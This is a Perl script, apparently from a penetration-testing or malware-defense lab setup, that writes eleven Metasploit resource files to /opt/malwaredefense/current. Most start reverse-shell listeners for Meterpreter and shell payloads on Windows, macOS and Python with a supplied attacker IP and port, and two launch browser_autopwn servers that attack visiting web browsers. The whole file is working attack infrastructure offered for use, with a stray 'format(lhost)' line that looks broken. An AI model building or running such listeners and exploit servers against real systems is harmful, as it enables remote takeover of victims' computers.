#!/usr/bin/perl
use strict;
use warnings;

  my($LHOST, $LPORT, $PROJECT, $PROJECTNUM);
  my ($OUTFILE, $targetFolder);

  $LHOST = shift or die "Expecting an IP address in arg 1";
  $LPORT = shift or die "Expecting a TCP Port address in arg 2";
  $PROJECT = shift or die "Expecting a Project Name in arg 3";
  $PROJECTNUM = shift or die "Expecting a Project Number in arg 4";

  $targetFolder="/opt/malwaredefense/current";
  `mkdir -p $targetFolder`;

  open( $OUTFILE, '>', "$targetFolder/900-reverse_tcp_noenc-32.rc");
print $OUTFILE <<TCPNOENC;
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC
  close $OUTFILE;


  open( $OUTFILE, '>', "$targetFolder/905-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPENC;
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC
  close $OUTFILE;


  open( $OUTFILE, '>', "$targetFolder/910-reverse_tcp-noenc-64.rc");
print $OUTFILE <<TCPNOENC64;
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC64
  close $OUTFILE;


  open( $OUTFILE, '>', "$targetFolder/915-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPENC64;
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC64
  close $OUTFILE;

  open( $OUTFILE, '>', "$targetFolder/950-reversehttps.rc");
print $OUTFILE <<RHTTPSNOENC;
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
RHTTPSNOENC
  close $OUTFILE;

  open( $OUTFILE, '>', "$targetFolder/960-browserautopwn1.rc");
print $OUTFILE <<BAPENC;
use auxiliary/server/browser_autopwn
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC
  close $OUTFILE;




  open( $OUTFILE, '>', "$targetFolder/965-browserautopwn2.rc");
print $OUTFILE <<BAPENC2;
use auxiliary/server/browser_autopwn2
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC2
  close $OUTFILE;



  open( $OUTFILE, '>', "$targetFolder/970-pythonreverse_tcp.rc");
print $OUTFILE <<PYRTCP;
use multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true 
exploit -j
PYRTCP
  close $OUTFILE;

  open( $OUTFILE, '>', "$targetFolder/975-MacShellReverseTCP.rc");
print $OUTFILE <<MACSHELL1;
use multi/handler
set payload osx/x86/shell_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
MACSHELL1
  close $OUTFILE;



  open( $OUTFILE, '>', "$targetFolder/980-stageless-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPSTAGELESS32;
use multi/handler
set payload windows/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS32
  close $OUTFILE;



  open( $OUTFILE, '>', "$targetFolder/990-stageless-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPSTAGELESS64;
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS64
  close $OUTFILE;

